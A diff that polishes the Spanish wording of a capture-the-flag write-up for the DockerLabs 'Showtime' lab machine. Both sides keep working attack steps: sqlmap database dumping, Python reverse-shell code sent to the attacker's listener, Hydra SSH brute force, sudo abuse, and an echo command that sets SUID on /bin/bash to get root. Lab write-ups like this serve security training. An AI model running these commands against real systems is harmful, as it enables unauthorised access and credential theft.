@@ -18,32 +18,32 @@ Empezamos con un escaneo de los puertos.
 
 # Resultado escaneo  
 
-Tenemos 2 puertos abiertos, el 22 y el 80.  
+Tenemos dos puertos abiertos, el 22 y el 80.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_1.jpg)    
 
-Abrimos la web y en la home no encontramos nada interesante.  
+Abrimos la página web y en la página de inicio no encontramos nada interesante.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_2.jpg)     
 
-Vemos que hay un enlace a Login y lo abrimos y vemos que nos encontramos un panel de autenticacíon.  
+Vemos que hay un enlace de inicio de sesión, lo abrimos y encontramos un panel de autenticación.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_3.jpg)    
 
-Utilizaremos la herramienta **sqlmap** para intentar extrapolar usernames y password.  
-Ejecutaremos el comando:  
+Utilizaremos la herramienta sqlmap para intentar extraer nombres de usuario y contraseñas.  
+Ejecutaremos el siguiente comando:  
 
 `sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms --dbs --batch`  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_4.jpg)    
 
-Ahora damos el comando:  
+Ahora ingresamos el siguiente comando:  
 
 `sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users --tables --batch`  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_5.jpg)      
 
-Seguimos la enumeración digitando:  
+Continuamos con la enumeración ingresando:  
 
 `sudo sqlmap -u http://172.17.0.2/login_page/index.php --forms -D users -T usuarios --columns --batch`  
 
@@ -55,15 +55,15 @@ Y por último:
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_7.jpg)      
 
-Perfecto!  
-Tenemos 3 usuarios con sus relativas contraseñas.  
+¡Perfecto!  
+Tenemos tres usuarios junto con sus respectivas contraseñas.  
 
-Probamos a logearnos pero solamente con el usaurio joe podemos acceder a un panel que nos permite ejecutar comandos python.  
+Intentamos iniciar sesión, pero solo con el usuario 'joe' podemos acceder a un panel que nos permite ejecutar comandos en Python.    
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_8.jpg)       
 
-Ahora probamos a ver si funciona.  
-Ejecutamos este comando:  
+Ahora verificamos si funciona.   
+Ejecutamos el siguiente comando:  
 
 ```
 import os  
@@ -71,10 +71,10 @@ os.system ("ls")
 ```
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_9.jpg)    
 
-Perfecto, parece funcionar.  
-Ahora lo que podemos intentar hacer es lanzarnos una reverse shell hacía nuestra maquina kali.
-Nos pondremos a la escucha en en puerto 6969 de la nuestra kali y ejecutaremos el comando `nc -lvnp 6969`.   
-Ahora ejecutaremo este cógido en el panel:  
+Perfecto, parece que funciona.  
+Ahora, lo que podemos intentar hacer es establecer una reverse shell hacia nuestra máquina Kali.  
+Nos pondremos a la escucha en el puerto 6969 de nuestra Kali y ejecutaremos el comando `nc -lvnp 6969`.  
+A continuación, ejecutaremos este código en el panel:   
 
 ```
 import socket
@@ -99,74 +99,74 @@ subprocess.call("/bin/sh")
 ```
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_10.jpg)    
 
-Perfecto!  
+¡Perfecto!   
 Hemos obtenido una reverse shell.  
-Ahora le aplicamos un tratamiento para poder trabajar más comodos.  
+Ahora aplicamos un tratamiento para poder trabajar de manera más cómoda.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_11.jpg)  
 
-Probamos a dar los tipicos comandos para intentar escalar de privilegios, pero no vemos nada interesante.  
+Intentamos ejecutar los comandos típicos para escalar privilegios, pero no encontramos nada interesante.   
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_12.jpg)   
 
-Entonces subimos el archivo linpeas.sh a la maquina victima.  
-Para ello nos montamos un server http en la nuesta maquina kali con el comando:  
-`sudo python3 -m http.server` y posteriormente descargamos el archivo en la maquina victima.  
-Le damos los permisos de ejecucíon con el comando `chmod +x` y lo ejecutamos.  
-Analizandolo todo vemos que hay un archivo oculto en la carpeta /tmp que se llama **.hidden_text.txt**  
+Entonces subimos el archivo `linpeas.sh` a la máquina víctima.  
+Para ello, montamos un servidor HTTP en nuestra máquina Kali con el comando:    
+`sudo python3 -m http.server`, y posteriormente descargamos el archivo en la máquina víctima.   
+Le damos permisos de ejecución con el comando `chmod +x` y lo ejecutamos.  
+Al analizar todo, vemos que hay un archivo oculto en la carpeta `/tmp` que se llama **.hidden_text.txt**.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_13.jpg)    
 
-Lo abrimos y vemos que contiene una serie de palabras todas en mayusculas.  
+Lo abrimos y vemos que contiene una serie de palabras, todas en mayúsculas.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_14.jpg)   
 
-Jugando con la imaginacíon podemos pensar que esto podría ser un listado de probables contraseña. 
-Probamos a crear un diccionario pero vemos que con hydra no logramos sacar la contraseña.  
-Una otra cosa que podemos hacer es convertir con **tr** todas las palabras de mayusculas a minusculas.  
-Para ello utilizamos el siguiente comando:  
+Jugando con la imaginación, podemos pensar que esto podría ser un listado de posibles contraseñas.   
+Intentamos crear un diccionario, pero con Hydra no logramos obtener la contraseña.  
+Otra cosa que podemos hacer es convertir con **tr** todas las palabras de mayúsculas a minúsculas.  
+Para ello, utilizamos el siguiente comando:  
 
 `cat pass.txt | tr '[:upper:]' '[:lower:]' > password.txt`  
 
-Y ahora intentamos otra vez con hydra para ver si sacamos algo que nos pueda servir.  
-Ejecutamos el comando:  
+Ahora intentamos nuevamente con Hydra para ver si conseguimos algo que nos pueda ser útil.  
+Ejecutamos el siguiente comando:   
 
-`sudo hydra -L users.txt -P password.txt ssh://172.17.0.2/`  y listo, conseguimos una contraseña valida pare el usuario joe.  
+`sudo hydra -L users.txt -P password.txt ssh://172.17.0.2/`  y listo, conseguimos una contraseña válida para el usuario 'joe'.    
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_15.jpg)     
 
-Ahora nos conectamos con el usuario joe y lanzamos el comando:  
+Ahora nos conectamos con el usuario 'joe' y ejecutamos el siguiente comando:  
 
 `sudo -l`  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_16.jpg)     
 
-Miramos en GTFOBins si podemos aprovechar de este binario y parece que sí.  
+Consultamos GTFOBins para ver si podemos aprovechar este binario y parece que sí.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_17.jpg)      
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_18.jpg)    
 
-Perfecto, ya hemos podido escalar a otro usuario.  
-Lanzamos otra vez el comando `sudo -l`  
+Perfecto, ya hemos logrado escalar a otro usuario.   
+Ejecutamos nuevamente el comando `sudo -l`.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_19.jpg)     
 
-Echamos un ojo a lo script en la carpeta de luciano.  
+Echamos un vistazo al script en la carpeta de luciano.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_20.jpg)      
 
-Ok, lo que haremos será modificarlo para poder escalar a root.  
-Vemos que no podemos utilizar ni el editor nano ni el vim.  
-Por lo tanto lo que haremos será utilizar el comando **echo**.  
-Lanzaremos el comando:  
+De acuerdo, lo que haremos será modificarlo para poder escalar a root.  
+Observamos que no podemos utilizar ni el editor nano ni vim.  
+Por lo tanto, utilizaremos el comando **echo**.   
+Ejecutaremos el siguiente comando:   
 
 `echo -e '#!/bin/bash \n chmod u+s /bin/bash' > .script.sh`  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_21.jpg)    
 
-Perfecto, ahora ejecutaremos el comando `sudo /bin/bash /home/luciano/script.sh` y luego el comando `bash -p`  y listo!  
-Ya somos root!  
+"Perfecto, ahora ejecutaremos el comando `sudo /bin/bash /home/luciano/script.sh` y luego el comando `bash -p`.  
+¡Y listo! Ahora somos root.  
 
 ![ST](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/showtime/ST_22.jpg)    
 
